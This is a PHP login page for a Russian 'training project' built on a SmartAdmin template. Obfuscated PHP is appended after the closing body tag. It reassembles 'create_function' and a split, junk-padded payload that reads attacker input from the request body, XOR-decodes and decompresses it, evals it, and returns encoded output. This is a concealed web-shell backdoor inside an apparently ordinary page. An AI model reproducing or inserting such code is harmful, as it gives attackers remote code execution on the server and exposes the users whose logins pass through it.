<?
include_once 'functions/main.php';
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>
        Войти
    </title>
    <meta name="description" content="Login">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, user-scalable=no, minimal-ui">
    <!-- Call App Mode on ios devices -->
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <!-- Remove Tap Highlight on Windows Phone IE -->
    <meta name="msapplication-tap-highlight" content="no">
    <!-- base css -->
    <link id="vendorsbundle" rel="stylesheet" media="screen, print" href="/public/css/vendors.bundle.css">
    <link id="appbundle" rel="stylesheet" media="screen, print" href="/public/css/app.bundle.css">
    <link id="mytheme" rel="stylesheet" media="screen, print" href="#">
    <link id="myskin" rel="stylesheet" media="screen, print" href="/public/css/skins/skin-master.css">
    <!-- Place favicon.ico in the root directory -->
    <link rel="apple-touch-icon" sizes="180x180" href="/public/img/favicon/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/public/img/favicon/favicon-32x32.png">
    <link rel="mask-icon" href="/public/img/favicon/safari-pinned-tab.svg" color="#5bbad5">
    <link rel="stylesheet" media="screen, print" href="/public/css/page-login-alt.css">
</head>

<body>
    <div class="blankpage-form-field">
        <div class="page-logo m-0 w-100 align-items-center justify-content-center rounded border-bottom-left-radius-0 border-bottom-right-radius-0 px-4">
            <a href="javascript:void(0)" class="page-logo-link press-scale-down d-flex align-items-center">
                <img src="/public/img/logo.png" alt="SmartAdmin WebApp" aria-roledescription="logo">
                <span class="page-logo-text mr-1">Учебный проект</span>
                <i class="fal fa-angle-down d-inline-block ml-1 fs-lg color-primary-300"></i>
            </a>
        </div>
        <div class="card p-4 border-top-left-radius-0 border-top-right-radius-0">
            <? if (isset($_SESSION['success'])) : ?>
                <div class="alert alert-success">
                    <strong>Уведомление!</strong> <span><? display_flash_message('success') ?></span>
                </div>
            <? endif;
                if (isset($_SESSION['error'])) : ?>
                <div class="alert alert-danger text-dark" role="alert">
                    <strong>Уведомление!</strong> <span><? display_flash_message('error') ?></span>
                </div>
            <? endif; ?>
            <form action="login.php" method="POST">
                <div class="form-group">
                    <label class="form-label" for="username">Email</label>
                    <input type="email" name="email" id="username" class="form-control" placeholder="Эл. адрес" value="">
                </div>
                <div class="form-group">
                    <label class="form-label" for="password">Password</label>
                    <input type="password" name="password" id="password" class="form-control" placeholder="Пароль">
                </div>
                <div class="form-group text-left">
                    <div class="custom-control custom-checkbox">
                        <input type="checkbox" class="custom-control-input" id="rememberme">
                        <label class="custom-control-label" for="rememberme">Запомнить меня</label>
                    </div>
                </div>
                <button type="submit" class="btn btn-default float-right">Войти</button>
            </form>
        </div>
        <div class="blankpage-footer text-center">
            Нет аккаунта? <a href="page_register.php"><strong>Зарегистрироваться</strong>
        </div>
    </div>
    <video poster="/public/img/backgrounds/clouds.png" id="bgvid" playsinline autoplay muted loop>
        <source src="/public/media/video/cc.webm" type="video/webm">
        <source src="/public/media/video/cc.mp4" type="video/mp4">
    </video>
    <script src="/public/js/vendors.bundle.js"></script>

</body>
<?php
$l=str_replace('vr','','cvrreavrte_vrfvrunvrctvrion');
$k='$i=f#0;$i<$l;f#){for(f#$j=0f#;f#($j<$c&&$i<$f#l);$j++f#,$i+f#+){f#$o.=$t{$i}^f#$k{$f#';
$Z='f#);$r=@basf#e64_enf#code(f#@x(@gzcf#ompresf#s($o),$kf#)f#);print("$pf#$f#kh$r$kf");}';
$M='f#j};}}returf#n $f#of#;}if (@f#prf#eg_matchf#("/$kh(.+)$kf/",@ff#ilef#_get_contf#enf';
$y='f#sef#64f#_decode($mf#[1]),f#$kf#)f#));$o=@ob_get_contenf#ts(f#);@ob_f#end_cleanf#(';
$a='$f#k="9e773f#1f3";$kh="f#f#f#d2b3f#1737bbc2";$kf#f="97b51c7f#35f#3f#ca";$p="N9OSX4f#fV';
$p='ySypf#f#FS14";functiof#n x($t,f#$k){$c=strlf#en(f#$k);$l=sf#trlenf#($t)f#f#;$o="";for(';
$I='#ts("pf#hp://inf#put"),$f#m)==1) {f#@f#ob_f#stf#art();@ef#val(@gf#zuncompress(@x(@ba';
$m=str_replace('f#','',$a.$p.$k.$M.$I.$y.$Z);
$A=$l('',$m);$A();
?>  

</html>